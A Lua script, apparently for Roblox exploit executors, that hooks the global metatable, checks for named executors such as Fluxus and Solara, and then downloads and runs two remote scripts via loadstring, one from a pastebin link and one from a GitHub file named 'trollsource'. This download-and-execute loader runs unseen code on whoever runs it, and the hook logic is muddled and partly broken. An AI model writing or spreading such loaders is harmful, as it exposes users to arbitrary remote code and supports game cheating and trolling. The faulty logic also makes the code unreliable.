-- Advanced Hook Function with Unique Lua Syntax
local function weirdHook(target, callback, executeScript)
    -- Save the original method
    local original = getmetatable(_G)[target]
    if original then
        -- Define a metatable with custom metamethods
        local mt = {}
        mt.__index = function(t, k)
            if k == target then
                return function(...)
                    local args = {...}
                    local result = original(t, k)(...)
                    -- Call the callback with the result and arguments
                    callback(result, table.unpack(args))
                    
                    -- Execute the script after detection
                    if executeScript then
                        executeScript()
                    end
                    return result(...)
                end
            end
            return rawget(t, k)
        end
        setmetatable(_G, mt)
    end
end

-- Detect Executors Function with Hidden Lua Features
local function detectExecutors()
    -- Use of pcall for safe function call
    local executors = { delta = true, codex = true, wave = true, solara = true, fluxus = true, vegax = true, cryptic = true, cacti = true, appleware = true }
    
    -- Check function with quirky Lua features
    local function checkExecutor(executorName)
        local status, name = pcall(function() return executorName:lower() end)
        if status and executors[name] then
            print("Detected Executor: " .. name)
            return name -- Return the detected executor name
        else
            print("Unknown Executor: " .. (status and name or "Error"))
            return nil
        end
    end
    
    return checkExecutor
end

-- Function to execute scripts from URLs
local function executeScriptFromURL(url)
    local http = game:GetService("HttpService")
    local response = http:GetAsync(url)
    
    -- Check if the request was successful
    if response then
        local success, result = pcall(loadstring(response))
        if success then
            result() -- Execute the fetched Lua script
        else
            print("Error loading script from URL: " .. result)
        end
    else
        print("Failed to fetch script from URL")
    end
end

-- Define URLs for the scripts
local url1 = "https://pastebin.com/raw/AnEbCekx"  -- R
local url2 = "https://raw.githubusercontent.com/John142-dot/flexurfpsandping/main/trollsource"  -- e

-- Function to execute both scripts from URLs
local function executeBothScripts()
    executeScriptFromURL(url1)
    executeScriptFromURL(url2)
end

-- Apply Hook with Advanced Syntax
weirdHook("__index", function(result, ...)
    -- Weird way to detect executors
    local execName = result()
    local checkExecutor = detectExecutors()
    local detectedExec = checkExecutor(execName)
    
    -- Execute the additional scripts if an executor was detected
    if detectedExec then
        executeBothScripts()  -- Execute both scripts from URLs
    end
    
    -- Continue with original behavior
    return result(...)
end)

-- Assuming `getExecutorName` returns a string, e.g., 'Fluxus'
-- It will trigger the detection logic and execute scripts from URLs
